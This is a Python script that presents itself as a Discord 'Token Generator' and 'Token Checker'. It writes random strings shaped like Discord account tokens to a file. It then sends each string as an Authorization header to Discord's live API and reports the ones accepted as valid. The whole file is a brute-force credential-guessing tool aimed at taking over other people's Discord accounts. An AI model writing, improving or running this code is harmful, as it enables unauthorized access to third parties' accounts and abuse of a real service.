import os
#    #   #   #   #   #
import random
#    #   #   #   #   #
import string
#    #   #   #   #   #
import time
#    #   #   #   #   #
import requests
#    #   #   #   #   #
from util.pluggins import *

banner()

def options():
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    import fade
    options = '''
    
    [1] Token Generator
    [2] Token Checker
    [3] Exit
    
    
    '''
    faded_text = fade.purpleblue(options)
    print(faded_text)

    option = Write.Input("Choice [>>] ", Colors.purple_to_blue, interval=0.000)

    if option == '1':
        os.system("cls")
        tokenbanner()
        cantidad = Write.Input("\nAmount To Generate [>>] ", Colors.purple_to_blue)
        while int(count) < int(cantidad):
            part1 = 'MTI' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(23))
            part2 = ''.join(random.choice(string.ascii_letters + string.digits + '_-') for _ in range(6))
            part3 = ''.join(random.choice(string.ascii_letters + string.digits + '_-') for _ in range(38))
            Generated = f"{part1}.{part2}.{part3}"
            
            f = open(current_path + "/Generated.txt", "a")
            f.write(Generated + "\n")
            Write.Print("\nToken: " + Generated, Colors.green_to_white, interval=0.000)
            count += 1
            if int(count) == int(cantidad):
                print(""" """)
                print(""" """)
                print(""" """)
                Write.Print(f"\n{cantidad} Tokens Generated Successfully!", Colors.purple_to_blue, interval=0.020)
                Write.Print(f"""\n{cantidad} Tokens Successfully Saved In "Generated.txt".""", Colors.purple_to_blue, interval=0.020)
                Write.Input(f"\nPress [ Enter ] To Exit.", Colors.purple_to_blue, interval=0.020)
                break

    elif option == '2':
        os.system("cls")
        tokenbanner()
        with open('Generated.txt', 'r') as f:
            for line in f:
                time.sleep(0)
                token = line.rstrip("\n")
                headers = {
                    'Authorization': f'{token}'  
                }
                src = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers)

                try:
                    if src.status_code == 200:
                        Write.Print(f'\nValid Token! [>>] ' + '| ' + token[:8] + '***********************' + ' |', Colors.green_to_blue, interval=0.000)
                    else:
                        Write.Print(f'\nInvalid Token [>>] ' + '| ' + token + ' |', Colors.red_to_blue, interval=0.000)
                except Exception:
                    Write.Print(f"Error, Please Contact Us! ", Colors.purple_to_blue, interval=0.000)
    elif option == '3':
        os.system("cls")
        quit()
    
    else:
        main()

def main():
    title()
    os.system('cls')
    tokenbanner()
    options()


if __name__ == '__main__':
    main()
